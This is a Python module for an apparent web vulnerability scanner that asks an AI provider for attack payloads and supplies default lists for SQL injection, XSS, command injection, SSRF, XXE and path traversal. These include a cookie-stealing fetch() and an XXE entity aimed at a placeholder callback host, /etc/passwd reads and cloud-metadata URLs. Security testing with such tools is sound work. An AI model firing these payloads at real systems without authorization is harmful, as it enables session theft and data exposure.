"""
AI Payload Generator
Generates intelligent, context-aware payloads using AI providers
"""

from typing import Dict, List, Optional
from utils.logger import get_logger

logger = get_logger(__name__)


class AIPayloadGenerator:
    """Generate intelligent security testing payloads using AI."""

    # Placeholder domain for out-of-band (OOB) callback payloads.
    # Users MUST replace this with their own OAST server (e.g., Burp Collaborator,
    # interact.sh, or a self-hosted callback listener) before running scans.
    # Using a domain you don't control risks leaking target data to third parties.
    OAST_CALLBACK_URL = "{CALLBACK_URL}"

    def __init__(self, ai_manager, config: Dict):
        """Initialize the AI payload generator."""
        self.ai_manager = ai_manager
        self.config = config
        self.payload_config = config.get('vulnerability_scanner', {}).get('payload_generation', {})

        # Allow users to configure their own OAST callback URL
        callback_url = config.get('scanner', {}).get('oast_callback_url', '')
        if callback_url:
            self.OAST_CALLBACK_URL = callback_url
        
    def generate_payloads(self, context: Dict) -> Dict[str, List[str]]:
        """
        Generate intelligent payloads based on context.
        
        Args:
            context: Dictionary containing URL, response, headers, etc.
            
        Returns:
            Dictionary mapping vulnerability types to payload lists
        """
        if not self.payload_config.get('use_ai', True):
            return self._get_default_payloads()
        
        payloads = {}
        
        try:
            # Generate SQL injection payloads
            payloads['sql_injection'] = self._generate_sql_payloads(context)
            
            # Generate XSS payloads
            payloads['xss'] = self._generate_xss_payloads(context)
            
            # Generate command injection payloads
            payloads['command_injection'] = self._generate_command_injection_payloads(context)
            
            # Generate SSRF payloads
            payloads['ssrf'] = self._generate_ssrf_payloads(context)
            
            # Generate XXE payloads
            payloads['xxe'] = self._generate_xxe_payloads(context)
            
            # Generate path traversal payloads
            payloads['path_traversal'] = self._generate_path_traversal_payloads(context)
            
        except Exception as e:
            logger.error(f"Error generating AI payloads: {e}")
            payloads = self._get_default_payloads()
        
        return payloads
    
    def _generate_sql_payloads(self, context: Dict) -> List[str]:
        """Generate SQL injection payloads."""
        prompt = f"""Generate 10 advanced SQL injection payloads for testing this context:
URL: {context.get('url')}
Parameters detected: {self._extract_parameters(context)}
Database hints: {self._detect_database_type(context)}

Generate payloads for:
1. Error-based SQL injection
2. Boolean-based blind SQL injection
3. Time-based blind SQL injection
4. Union-based SQL injection
5. Stacked queries

Return only the payloads, one per line, without explanations."""
        
        ai_payloads = self._get_ai_response(prompt)
        
        # Combine with default payloads
        default_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
        ]
        
        return ai_payloads + default_payloads
    
    def _generate_xss_payloads(self, context: Dict) -> List[str]:
        """Generate XSS payloads."""
        prompt = f"""Generate 10 advanced XSS payloads for testing this context:
URL: {context.get('url')}
Input fields detected: {self._extract_input_fields(context)}
Content-Type: {context.get('headers', {}).get('content-type', 'unknown')}

Generate payloads for:
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. Filter bypass techniques
5. Event handler-based XSS

Return only the payloads, one per line, without explanations."""
        
        ai_payloads = self._get_ai_response(prompt)
        
        default_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            f"<script>fetch('{self.OAST_CALLBACK_URL}?c='+document.cookie)</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert&#40;'XSS')</script>",
            "<img src=\"x\" onerror=\"alert`1`\">",
            "<details open ontoggle=alert(1)>",
        ]
        
        return ai_payloads + default_payloads
    
    def _generate_command_injection_payloads(self, context: Dict) -> List[str]:
        """Generate command injection payloads."""
        default_payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ]
        
        return default_payloads
    
    def _generate_ssrf_payloads(self, context: Dict) -> List[str]:
        """Generate SSRF payloads."""
        default_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "http://[::1]",
            "http://2130706433",
            "http://0x7f000001",
        ]
        
        return default_payloads
    
    def _generate_xxe_payloads(self, context: Dict) -> List[str]:
        """Generate XXE payloads."""
        default_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.OAST_CALLBACK_URL}/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
        ]
        
        return default_payloads
    
    def _generate_path_traversal_payloads(self, context: Dict) -> List[str]:
        """Generate path traversal payloads."""
        default_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/..;/..;/etc/passwd",
            "/var/www/../../etc/passwd",
        ]
        
        return default_payloads
    
    def _get_ai_response(self, prompt: str) -> List[str]:
        """Get response from AI provider."""
        try:
            response = self.ai_manager.generate(prompt)
            # Parse response into list of payloads
            payloads = [line.strip() for line in response.split('\n') if line.strip()]
            return payloads[:10]  # Limit to 10 payloads
        except Exception as e:
            logger.warning(f"Failed to get AI response: {e}")
            return []
    
    def _extract_parameters(self, context: Dict) -> str:
        """Extract URL parameters from context."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(context.get('url', ''))
        params = parse_qs(parsed.query)
        return ', '.join(params.keys()) if params else 'None'
    
    def _extract_input_fields(self, context: Dict) -> str:
        """Extract input fields from response."""
        # This would parse HTML and extract input fields
        return "To be implemented based on response parsing"
    
    def _detect_database_type(self, context: Dict) -> str:
        """Detect database type from response headers or errors."""
        # Check for database-specific error messages or headers
        return "Unknown"
    
    def _get_default_payloads(self) -> Dict[str, List[str]]:
        """Get default payload set without AI."""
        return {
            'sql_injection': self._generate_sql_payloads({}),
            'xss': self._generate_xss_payloads({}),
            'command_injection': self._generate_command_injection_payloads({}),
            'ssrf': self._generate_ssrf_payloads({}),
            'xxe': self._generate_xxe_payloads({}),
            'path_traversal': self._generate_path_traversal_payloads({})
        }
